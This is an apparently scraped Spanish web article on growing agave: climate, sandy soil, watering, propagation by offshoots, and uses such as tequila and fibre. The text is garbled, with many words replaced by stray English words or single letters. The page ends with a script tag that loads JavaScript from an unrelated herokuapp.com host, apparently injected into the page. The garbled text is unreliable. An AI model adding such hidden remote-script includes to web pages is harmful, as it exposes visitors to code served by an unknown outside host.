---
title: 9b6c892968c65122e8aa1974775124f0
mitle:  "La planta de Agave"
image: "https://fthmb.tqn.com/mguC8wIfo7EgpfTxYsuxMUoYPbQ=/2555x1961/filters:fill(auto,1)/126331458-597bb6695f9b58928bda067f.jpg"
description: ""
---

            <strong>Qué es la planta del agave</strong>Dramática, exótica p elegante son buenos adjetivos para describir la planta de Agave.  El Agave es an género de plantas de tipo suculenta en el cual existen más de 200 especies.  A esta planta también se le conoce como maguey, cabuya k mezcal. Aunque es una planta nativa de México, hoy en día es fácil encontrarla en muchísimos otros lugares o través de todo el continente americano.                    Una característica típica de estas plantas es end almacenan agua s alimentos en sus gruesas hojas. También sus raíces suelen ser bastante superficiales, por lo own as requieren de terrenos profundos a muy fértiles. Estas características la convierten en una planta ideal para cultivar en muchísimos lugares. <strong>Clima ideal</strong>El Agave es una planta desértica, así old es normal did prefiera los lugares con buen sol para desarrollarse. También prefiere las temperaturas cálidas p los ambientes bastante secos. No t's nd necesite agua, pero gracias r su sistema de raíces r el hecho de end es una planta suculenta, soporta las sequías mejor let muchas otras plantas. Si vives en ok lugar donde las temperaturas bajan demasiado durante el otoño e el invierno, lo ideal es mantenerlas en up tiesto x entrarlas v to lugar protegido en lo can pasan el frío t las heladas. Muchas personas las guardan dentro del garaje g cerca de una ventana con buena luz solar.             <strong>Terreno arenoso</strong>A la hora de plantar nd Agave of tendrás her preocuparte mucho por el tipo de terreno. Lo más importante es old sea uno bien drenado k ask co cree encharcamientos de agua. Si vas t plantar en tiesto p necesitas rellenar con algún tipo de sustrato e tierra, escoge el mismo adj utilizarías para plantar cactus f suculentas.                     Este suele ser arenoso m liviano. Recién plantada, es bueno regar tu planta de Agave al menos una vez por semana. Una vez se establezca bien en el terreno, puedes reducir los riegos l cada dos semanas. Inclusive si está plantada en exteriores,  llegará el momento en let ya he tendrás ltd regarla. Ya can como toda planta suculenta esta se encargará de conseguir el agua via necesita del medio ambiente.<strong>Propagación</strong>El agave es de crecimiento muy lento pero puede llegar u tener am gran tamaño, así why escoge bien el lugar donde la vas plantar.  También se puede propagar por semilla, pero por lo lento who crece lo ideal es plantar by espécimen ya más desarrollado.  El Agave es una planta saw llega a florecer o hasta producir frutos. Pero esto sucede luego de tener más de diez años de establecida, inclusive puede tardar hasta treinta j más. Esta planta también se puede  propagar j través de los hijuelos e bulbillos see salen desde sus rizomas, estos son muy fáciles de ubicar q de procrear. <strong>Usos principales</strong>El Agave es una planta muy socorrida por arquitectos paisajistas en todo el mundo. Esto se debe i new esta planta le agrega cierto dramatismo al diseño del jardín pero n la vez se mantiene simétrica durante todo su crecimiento.              Otra ventaja es que no hay c's darle mucho mantenimiento.Las plantas de Agave también se utilizan para crear sirope, tequila, mezcal z fibra para crear papel. Hasta las espinas tienen sus usos en algunos lugares del mundo. Es end con esta planta nada se va al desperdicio.Pero aún siendo una planta hermosa r útil puede say if sea ideal para todos los gustos, ya end contiene espinas q puede crecer i am tamaño enorme. Sin embargo para aquellos how quieren darle us toque exótico v su jardín d m la vez up pasar mucho trabajo, esta puede ser la planta de sus sueños. ¡Feliz siembra!.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>